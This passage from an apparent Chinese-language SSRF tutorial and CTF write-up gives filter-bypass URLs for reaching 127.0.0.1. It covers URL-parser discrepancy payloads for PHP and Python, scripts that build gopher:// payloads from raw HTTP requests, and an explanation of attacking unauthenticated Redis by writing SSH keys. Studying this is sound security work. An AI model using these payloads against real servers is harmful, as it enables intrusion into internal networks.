<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-title function_ invoke__">http</span>(s):<span class="hljs-comment">//sudo.cc/指向127.0.0.1</span><br><br>url=http:<span class="hljs-comment">//sudo.cc/flag.php</span><br><br>也可以<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);<br></code></pre></td></tr></table></figure>

<h3 id="进制的转换绕过内网IP"><a href="#进制的转换绕过内网IP" class="headerlink" title="进制的转换绕过内网IP"></a>进制的转换绕过内网IP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-variable">$ip</span>);<br><span class="hljs-variable">$r</span> = (<span class="hljs-variable">$ip</span>[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>) | (<span class="hljs-variable">$ip</span>[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>) | (<span class="hljs-variable">$ip</span>[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-variable">$ip</span>[<span class="hljs-number">3</span>] ;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$r</span> &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-variable">$r</span> += <span class="hljs-number">4294967296</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;十进制:&quot;</span>;     <span class="hljs-comment">// 2130706433</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$r</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;八进制:&quot;</span>;     <span class="hljs-comment">// 0177.0.0.1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">decoct</span>(<span class="hljs-variable">$r</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;十六进制:&quot;</span>;   <span class="hljs-comment">// 0x7f.0.0.1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$r</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>





<h3 id="其他各种指向127-0-0-1的地址"><a href="#其他各种指向127-0-0-1的地址" class="headerlink" title="其他各种指向127.0.0.1的地址"></a>其他各种指向127.0.0.1的地址</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/         # localhost就是代指<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">0</span>/                 # <span class="hljs-number">0</span>在window下代表<span class="hljs-number">0.0.0.0</span>，而在liunx下代表<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">http</span>://[<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:ffff:<span class="hljs-number">127.0.0.1</span>]/    # 在liunx下可用，window测试了下不行<br><span class="hljs-attribute">http</span>://[::]:<span class="hljs-number">80</span>/           # 在liunx下可用，window测试了下不行<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>。<span class="hljs-number">0</span>。<span class="hljs-number">0</span>。<span class="hljs-number">1</span>/       # 用中文句号绕过<br><span class="hljs-attribute">http</span>://①②⑦.⓪.⓪.①<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>.<span class="hljs-number">1</span>/<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>.<span class="hljs-number">00000</span>.<span class="hljs-number">00000</span>.<span class="hljs-number">001</span>/ # <span class="hljs-number">0</span>的数量多一点少一点都没影响，最后还是会指向<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure>







<h3 id="利用URL的解析差异"><a href="#利用URL的解析差异" class="headerlink" title="利用URL的解析差异"></a>利用URL的解析差异</h3><p><strong>（1）利用readfile和parse_url函数的解析差异绕过指定的端口</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://&#x27;</span>. <span class="hljs-variable">$_GET</span>[url];<br><span class="hljs-variable">$parsed</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>( <span class="hljs-variable">$parsed</span>[port] == <span class="hljs-number">80</span> )&#123;  <span class="hljs-comment">// 这里限制了我们传过去的url只能是80端口的</span><br>	<span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$url</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>	<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hacker!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">（假设主机端口<span class="hljs-number">11211</span>是开放的）<br>payload：<br>?url=<span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">11211:80</span>/flag.txt<br></code></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210114/1610601312_5fffd36035478c41c2c18.png!small?1610601312696" srcset="/img/loading.gif" lazyload alt="1610601312_5fffd36035478c41c2c18.png!small?1610601312696"></p>
<p><strong>（2）利用curl和parse_url的解析差异绕指定的host</strong></p>
<p>原理如下：</p>
<p><img src="https://image.3001.net/images/20210114/1610601386_5fffd3aa565a51587d90c.png!small?1610601386867" srcset="/img/loading.gif" lazyload alt="1610601386_5fffd3aa565a51587d90c.png!small?1610601386867"></p>
<p>从上图中可以看到curl()函数解析的是第一个@后面的网址，而parse_url()函数解析的是第二个@后面的网址。利用这个原理我们可以绕过题目中parse_url()函数对指定host的限制。</p>
<p>buu SSRF Training</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) //获取<span class="hljs-title">url</span>的域名，将域名转为<span class="hljs-title">ip</span>，然后再判断这个<span class="hljs-title">ip</span>是否是私有地址</span><br><span class="hljs-function"></span>&#123; <br>    <span class="hljs-variable">$match_result</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>); <br>    <span class="hljs-comment">//^从开头开始匹配</span><br>   	<span class="hljs-comment">//? 匹配0或1个正好在它之前的那个字符。注意：这个元字符不是所有的软件都支持的</span><br>    <span class="hljs-comment">//( )标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 \( 和 \)</span><br>    <span class="hljs-comment">//.	匹配除换行符 \n 之外的任何单字符。要匹配 . ，使用 \. </span><br>    <span class="hljs-comment">//*	匹配前面的子表达式零次或多次。要匹配 * 字符，使用 \*</span><br>    <span class="hljs-comment">//$:从字符串末尾进行匹配</span><br>    <span class="hljs-comment">//需要形如http://xxxx/的ip地址</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>) <br>    &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>); <br>        <span class="hljs-comment">//如果url不符合正则表达式</span><br>    &#125; <br>    <span class="hljs-keyword">try</span> <br>    &#123; <br>        <span class="hljs-variable">$url_parse</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>); <br>        <span class="hljs-comment">//分解出一个URL的各个部</span><br>        <span class="hljs-comment">// $url_parse是一个数组</span><br>        <br>    &#125; <br>    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) <br>    &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>    &#125; <br>    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>]; <span class="hljs-comment">//hostname 为主机名，也就是域名</span><br>    <span class="hljs-variable">$ip</span>=<span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$hostname</span>); <span class="hljs-comment">//通过域名获取IP地址</span><br>    <span class="hljs-variable">$int_ip</span>=<span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-variable">$ip</span>); <span class="hljs-comment">//ip2long：将IPv4的ip地址（以小数点分隔形式）转换为int</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>; <br>    <span class="hljs-comment">//判断是否是私有地址，是则这个函数就返回1</span><br>&#125; <br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span><br><span class="hljs-function"></span>&#123; <br>     <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_inner_ip</span>(<span class="hljs-variable">$url</span>)) <br>    <span class="hljs-comment">//判断url是否是私有地址</span><br>    &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>; <br>    &#125; <br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <span class="hljs-comment">//初始化新的会话,返回 cURL 句柄，供curl_setopt()、 curl_exec() 和 curl_close() 函数使用</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>); <span class="hljs-comment">//访问的域名</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <span class="hljs-comment">//</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>); <span class="hljs-comment">//</span><br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">//抓取URL并把它传递给浏览器</span><br>        <span class="hljs-variable">$result_info</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">//php curl请求在curl_exec()函数执行之后，可以使用curl_getinfo()函数获取CURL请求输出的相关信息</span><br>     <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]) <br>        &#123; <br>            <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">// 关闭cURL资源，并且释放系统资源</span><br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$output</span>); <span class="hljs-comment">//执行</span><br>    &#125; <br>     <br>&#125; <br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]; <br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$url</span>))&#123;   <span class="hljs-comment">//判断url是否为空，不为空就执行</span><br>    <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$url</span>); <br>&#125; <br><br></code></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">ip2long(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)  结果为<span class="hljs-number">2130706433</span><br>ip2long(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span>  结果为<span class="hljs-number">127</span> <br>ip2long(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || ip2long(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>; <br>    <span class="hljs-regexp">//</span>判断是否是私有地址<br></code></pre></td></tr></table></figure>

<p>定义了两个方法check_inner_ip和safe_request_url</p>
<p>check_inner_ip里用parse_url来解析url后，通过正则匹配、ip2long等来过滤内网</p>
<p>safe_request_url 通过check_inner_ip检测为安全网站后利用curl来处理请求</p>
<p>关键是要绕过check_inner_ip的检测，那么这里就利用了curl和parse_url的解析差异</p>
<p><img src="https://image.3001.net/images/20210114/1610601386_5fffd3aa565a51587d90c.png!small?1610601386867" srcset="/img/loading.gif" lazyload alt="1610601386_5fffd3aa565a51587d90c.png!small?1610601386867"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span>=<span class="hljs-string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>));<br><br>输出：<br><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [scheme] =&gt; http<br>    [host] =&gt; hostname<br>    [user] =&gt; username<br>    [pass] =&gt; password<br>    [path] =&gt; /path<br>    [query] =&gt; arg=value<br>    [fragment] =&gt; anchor<br>)<br>  <br>  url换成 http:<span class="hljs-comment">//a:@127.0.0.1:80@baidu.com</span><br>输出：<br>  <span class="hljs-title function_ invoke__">Array</span><br>(<br>    [scheme] =&gt; http<br>    [host] =&gt; baidu.com<br>    [user] =&gt; a<br>    [pass] =&gt; @<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span><br><br></code></pre></td></tr></table></figure>

<p>这样就可以过函数的检测,而curl取到的是127.0.0.1:80</p>
<p>最终payload：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//a</span>:@127.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">80</span>@baidu.com/flag.php<br></code></pre></td></tr></table></figure>

<p>(3)python函数解析差异</p>
<p><img src="/image/2.png" srcset="/img/loading.gif" lazyload alt="python函数解析差异"></p>
<p>测试代码：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>url=request<span class="hljs-selector-class">.form</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;handler&#x27;</span>]</span><br>host = urlparse<span class="hljs-selector-class">.urlparse</span>(url)<span class="hljs-selector-class">.hostname</span>  <span class="hljs-comment">//urllib2自带的库</span><br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;secret.corp&#x27;</span>:    <br>    return <span class="hljs-string">&#x27;Restricted Area!&#x27;</span><br><span class="hljs-keyword">else</span>:    <br>return urllib<span class="hljs-selector-class">.urlopen</span>(url)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure>

<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">payload:</span><br><span class="hljs-symbol">http:</span>//google.com<span class="hljs-meta"># @secret.corp</span><br></code></pre></td></tr></table></figure>

<p>这里SSRF漏洞产生的根本原因是url中有空格(CRLF注入)，这让python中的两个模块解析url的时候起了冲突，urlparse认为host是google.com，而urllib则认为真正的host是secret.corp并且直接发出了请求。</p>
<h3 id="常见攻击方式（Gopher协议）"><a href="#常见攻击方式（Gopher协议）" class="headerlink" title="常见攻击方式（Gopher协议）"></a>常见攻击方式（Gopher协议）</h3><p>Gopher协议支持发出GET、POST请求，我们可以先截获GET请求包和POST请求包，再构造成符合Gopher协议请求的payload进行SSRF利用，甚至可以用它来攻击内网中的Redis、MySql、FastCGI等应用，这无疑大大扩展了我们的SSRF攻击面。</p>
<p><strong>（1）Gopher协议格式</strong></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">URL:</span> <span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/&lt;gopher-path&gt;_</span>后接<span class="hljs-title class_">TCP</span>数据流<br><br><span class="hljs-comment"># 注意不要忘记后面那个下划线&quot;_&quot;，下划线&quot;_&quot;后面才开始接TCP数据流，如果不加这个&quot;_&quot;，那么服务端收到的消息将不是完整的，该字符可随意写。</span><br></code></pre></td></tr></table></figure>

<ul>
<li>gopher的默认端口是70</li>
<li>如果发起POST请求，回车换行需要使用<code>%0d%0a</code>来代替<code>%0a</code>，如果多个参数，参数之间的&amp;也需要进行URL编码</li>
</ul>
<blockquote>
<p>那么如何利用Gopher发送HTTP的请求呢？例如GET请求。我们直接发送一个原始的HTTP包不就行了吗。在gopher协议中发送HTTP的数据，需要以下三步：</p>
<ol>
<li>抓取或构造HTTP数据包</li>
<li>URL编码、将回车换行符<code>%0a</code>替换为<code>%0d%0a</code></li>
<li>发送符合gopher协议格式的请求</li>
</ol>
</blockquote>
<p><strong>（2）利用Gopher协议发送HTTP GET请求</strong></p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// echo.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;whoami&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>接下来我们构造payload。一个典型的GET型的HTTP包类似如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/echo.php?whoami=Bunny</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>47.xxx.xxx.72<br></code></pre></td></tr></table></figure>

<p>然后利用以下脚本进行一步生成符合Gopher协议格式的payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;GET /echo.php?whoami=Bunny HTTP/1.1</span><br><span class="hljs-string">Host: 47.xxx.xxx.72</span><br><span class="hljs-string">&quot;&quot;&quot;</span>  <br><span class="hljs-comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://47.xxx.xxx.72:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意这几个问题：</strong></p>
<ol>
<li>问号（?）需要转码为URL编码，也就是%3f</li>
<li>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</li>
<li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li>
</ol>
</blockquote>
<p><strong>（3）利用Gopher协议发送HTTP POST请求</strong></p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// echo.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;whoami&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>接下来我们构造payload。一个典型的POST型的HTTP包类似如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/echo.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>47.xxx.xxx.72<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>12<br><br><span class="language-abnf"><span class="hljs-attribute">whoami</span><span class="hljs-operator">=</span>Bunny</span><br></code></pre></td></tr></table></figure>

<p><strong>注意：上面那四个HTTP头是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。并且，特别要注意Content-Length应为字符串“whoami&#x3D;Bunny”的长度。</strong></p>
<p>最后用脚本我们将上面的POST数据包进行URL编码并改为gopher协议</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;POST /echo.php HTTP/1.1</span><br><span class="hljs-string">Host: 47.xxx.xxx.72</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 12</span><br><span class="hljs-string"></span><br><span class="hljs-string">whoami=Bunny</span><br><span class="hljs-string">&quot;&quot;&quot;</span>  <br><span class="hljs-comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://47.xxx.xxx.72:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>

<p>例题 <strong>[2020 科来杯初赛]Web1</strong></p>
<h3 id="攻击内网Redis"><a href="#攻击内网Redis" class="headerlink" title="攻击内网Redis"></a>攻击内网Redis</h3><p>Redis是数据库的意思。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>
<blockquote>
<p><strong>什么是Redis未授权访问？</strong></p>
<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
<p>简单说，漏洞的产生条件有以下两点：</p>
<ul>
<li>redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</li>
<li>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</li>
</ul>
</blockquote>
